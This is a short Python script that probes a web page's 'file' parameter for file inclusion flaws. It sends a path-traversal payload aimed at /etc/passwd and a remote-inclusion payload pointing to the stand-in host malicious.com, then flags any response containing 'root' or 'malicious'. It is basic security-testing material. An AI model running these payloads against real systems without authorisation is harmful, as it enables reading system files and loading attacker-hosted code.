import requests

def test_file_inclusion(url, parameter):
    payloads = ["../../etc/passwd", "http://malicious.com/malicious_file"]
    vulnerabilities = []

    for payload in payloads:
        test_url = f"{url}?{parameter}={payload}"
        response = requests.get(test_url)
        
        if "root" in response.text or "malicious" in response.text:
            vulnerabilities.append(test_url)
    
    return vulnerabilities

if __name__ == "__main__":
    target_url = "http://example.com/file"
    parameter = "file"
    results = test_file_inclusion(target_url, parameter)
    print(f"Possible file inclusion vulnerabilities: {results}")
